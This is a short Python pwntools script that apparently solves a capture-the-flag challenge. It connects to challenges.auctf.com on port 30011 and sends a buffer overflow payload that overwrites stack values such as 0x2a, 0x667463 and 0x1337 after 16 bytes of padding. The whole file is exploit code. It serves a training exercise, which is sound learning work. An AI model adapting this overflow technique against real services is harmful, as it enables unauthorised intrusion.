#!/usr/bin/python
from pwn import *

r = remote('challenges.auctf.com', 30011)

payload = "A"*16 + p32(0x2a) + "A"*4 + p32(0x667463) + p32(0xffffffe8) + p32(0x1337)
r.recvuntil("Sorry that's all I got!")
r.sendline(payload)
print r.recvall()
r.close()
